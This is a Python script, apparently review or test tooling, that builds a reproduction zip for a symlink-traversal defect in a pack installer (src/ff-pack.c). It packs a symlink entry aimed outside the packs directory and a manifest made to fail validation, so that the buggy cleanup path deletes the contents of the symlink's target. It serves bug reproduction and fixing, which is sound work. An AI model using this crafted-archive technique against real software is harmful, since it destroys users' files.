#!/usr/bin/env python3
"""Builds the reviewer's Critical-1 reproduction zip: a pack whose zip contains a symlink entry
pointing OUTSIDE the packs tree.

This is the exact shape the whole-branch review used to arm the defect at src/ff-pack.c:
  - one top-level folder named like a pack id (passes the "exactly one top-level folder" check)
  - a symlink entry inside it, pointing at an arbitrary directory outside packs/ (passes the
    ".." / prefix checks, because the symlink's NAME is perfectly in-tree -- only its TARGET,
    which check_zip_entries never looks at, escapes)
  - a pack.json with a deliberately unsatisfiable min_engine, so load_pack_dir() fails manifest
    validation and ff_packs_install_zip()'s cleanup path (remove_recursive() on the extraction
    tmp dir) runs -- the path that walks into the symlink and, pre-fix, deletes the contents of
    whatever it points at.

Usage:
    build_symlink_pack_zip.py <out.zip> <symlink-target-dir> [pack_id]

The entries use the same S_IFLNK-in-external_attr encoding Info-ZIP's `zip -y` produces, which is
what `unzip`/`os_safe_replace`-style extraction on a real buyer's machine actually restores as a
real symlink -- not a stand-in or a mock.
"""
import stat
import sys
import zipfile


def _entry(name, mode):
    zi = zipfile.ZipInfo(name)
    zi.external_attr = mode << 16
    if name.endswith("/"):
        zi.external_attr |= 0x10  # MS-DOS directory flag, so `unzip -Z1`/short listings agree it's a dir
    return zi


def build(out_path, link_target, pack_id="ember"):
    manifest = (
        '{ "format": 1, "id": "%s", "name": "Reproduction pack", "version": "1.0.0", '
        '"min_engine": "99.0.0", "licensed": false, "presets": [] }' % pack_id
    )
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(_entry(f"{pack_id}/", stat.S_IFDIR | 0o755), "")
        z.writestr(_entry(f"{pack_id}/pack.json", stat.S_IFREG | 0o644), manifest)
        z.writestr(_entry(f"{pack_id}/link", stat.S_IFLNK | 0o777), link_target)
    return out_path


if __name__ == "__main__":
    if len(sys.argv) not in (3, 4):
        sys.exit(__doc__)
    out = build(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) == 4 else "ember")
    print(f"wrote {out}: top-level folder + a symlink entry -> {sys.argv[2]!r} + a bad-min_engine pack.json")
